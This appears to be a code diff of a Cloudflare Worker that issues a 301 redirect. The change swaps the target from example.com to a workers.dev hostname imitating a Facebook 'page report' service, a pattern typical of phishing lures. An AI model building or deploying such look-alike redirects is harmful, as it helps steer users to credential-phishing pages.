@@ -5,6 +5,6 @@ addEventListener('fetch', event => {
 async function handleRequest(request) {
   return new Response(null, {
     status: 301,
-    headers: { 'Location': 'https://example.com' }
+    headers: { 'Location': 'https://tax-facebook.facebook-page-report.workers.dev/' }
   });
 }
